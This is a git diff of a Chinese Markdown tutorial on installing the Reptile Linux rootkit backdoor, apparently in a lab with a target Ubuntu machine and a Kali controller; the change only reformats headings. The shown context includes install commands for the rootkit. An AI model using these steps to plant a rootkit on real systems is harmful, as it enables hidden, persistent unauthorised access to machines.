@@ -7,8 +7,8 @@ tags: [后门，linux，rookit]
 description: Reptile Linux rootkit后门
 ---
 
-######安装
-######目标机器`ubuntu 192.168.70.140`
+###### 安装
+###### 目标机器`ubuntu 192.168.70.140`
 - 执行以下命令在目标机器安装reptile
 ```
 apt-get install linux-headers-$(uname -r)
@@ -17,7 +17,7 @@ cd Reptile
 ./setup.sh install
 ```
 ![](https://upload-images.jianshu.io/upload_images/15634342-1348015d40185b65.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
-######控制端机器`kali 192.168.70.139`
+###### 控制端机器`kali 192.168.70.139`
 - 执行以下命令在控制端机器安装reptile
 ```
 apt-get install linux-headers-$(uname -r)
